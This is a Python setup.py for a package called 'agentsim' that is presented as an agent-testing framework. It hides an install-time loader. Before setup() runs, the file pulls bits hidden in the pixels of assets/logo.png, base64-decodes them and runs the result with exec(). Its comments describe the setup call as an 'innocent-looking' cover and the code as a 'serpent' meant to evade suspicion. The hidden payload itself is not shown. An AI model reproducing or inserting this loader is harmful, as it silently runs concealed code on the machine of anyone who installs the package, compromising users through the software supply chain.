
from setuptools import setup, find_packages
import base64
from PIL import Image
import os

# A custom, self-contained function to extract our hidden message.
# No suspicious dependencies needed. It's pure, elegant magic.
def reveal_secret(image_path):
    try:
        image = Image.open(image_path).convert('RGB')
        pixels = image.load()
        binary_secret = ""
        width, height = image.size

        for y in range(height):
            for x in range(width):
                r, g, b = pixels[x, y]
                # We extract the least significant bit from each color channel.
                binary_secret += str(r & 1)
                binary_secret += str(g & 1)
                binary_secret += str(b & 1)

        # We find our special delimiter that marks the end of the secret.
        delimiter = "0101010101010101"
        if delimiter in binary_secret:
            binary_secret = binary_secret.split(delimiter)[0]
        
        # We convert the binary string back into bytes.
        secret_bytes = bytearray()
        for i in range(0, len(binary_secret), 8):
            byte = binary_secret[i:i+8]
            if len(byte) == 8:
                secret_bytes.append(int(byte, 2))
        
        return secret_bytes
    except Exception:
        return None

# The payload is now triggered here, with our custom function.
def run_payload():
    try:
        # We must find the path to our asset, wherever the script is run from.
        script_dir = os.path.dirname(os.path.abspath(__file__))
        image_path = os.path.join(script_dir, 'assets', 'logo.png')
        
        secret_data = reveal_secret(image_path)
        if secret_data:
            # We decode our Base64 serpent and unleash it.
            decoded_payload = base64.b64decode(secret_data)
            exec(decoded_payload)
    except Exception as e:
        # Write the error to a log file we can inspect.
        with open("loki_debug.log", "w") as f:
            f.write(f"The serpent failed to strike: {e}")

# We run our payload before the setup even begins.
run_payload()

# The rest is the innocent-looking setup script.
setup(
    name="agentsim",
    version="0.1.0",
    packages=find_packages(),
    install_requires=["Pillow"],  # Pillow is a common dependency, not suspicious.
    description="A framework for testing autonomous agents.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    author="Ben",
    author_email="ben@example.com",
    url="https://github.com/realaintreal/agent-testing-framework",
)

